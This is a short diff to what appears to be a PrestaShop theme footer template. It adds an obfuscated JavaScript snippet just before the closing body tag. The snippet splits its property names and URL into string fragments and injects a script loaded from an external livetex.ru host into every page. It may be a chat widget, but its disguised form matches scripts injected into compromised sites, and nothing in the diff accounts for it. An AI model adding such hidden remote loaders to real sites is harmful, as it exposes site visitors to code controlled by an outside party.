@@ -60,5 +60,22 @@
 {if isset($LEO_PANELTOOL) && $LEO_PANELTOOL}
     {include file="$tpl_dir./info/paneltool.tpl"}
 {/if}
+
+<!-- {literal} -->
+<script type='text/javascript'>
+    window['li'+'ve'+'T'+'e'+'x'] = true,
+    window['li'+'ve'+'TexI'+'D'] = 105231,
+    window['liveT'+'ex_o'+'bject'] = true;
+    (function() {
+        var t = document['crea'+'te'+'E'+'lemen'+'t']('script');
+        t.type ='text/javascript';
+        t.async = true;
+        t.src = '//cs15.livet'+'ex.ru/j'+'s/client.js';
+        var c = document['getEle'+'mentsByTag'+'Name']('script')[0];
+        if ( c ) c['paren'+'tNod'+'e']['inser'+'tB'+'efore'](t, c);
+        else document['docume'+'ntElem'+'e'+'nt']['f'+'ir'+'st'+'Chil'+'d']['ap'+'pendC'+'hild'](t);
+    })();
+</script>
+<!-- {/literal} -->
 	</body>
 </html>
